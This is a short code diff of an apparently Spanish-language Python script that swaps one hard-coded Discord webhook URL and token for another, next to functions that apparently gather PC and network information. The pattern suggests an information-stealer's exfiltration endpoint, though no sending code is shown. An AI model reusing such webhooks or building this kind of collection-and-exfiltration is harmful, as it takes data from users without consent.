@@ -225,7 +225,7 @@ def empaquetar_network():
 
 ######## Webhook #############################################################
 
-WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1557079500712575016/UgqNpfxAwc0j3moHXUZs6g5ljdLmwPfwQGjnQWAAr2WemT8v3XL_mhJNE-2kzWbCo2OA"
+WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1560081432678895616/zHK9qlIKhkH4FyZmxwrybudV8QEqVrhz-IY0avSoUKk3pyaV9J8PSZTgiW8PyjxXyMHa"
 
 def obtener_info_pc():
     info_sistema = {}
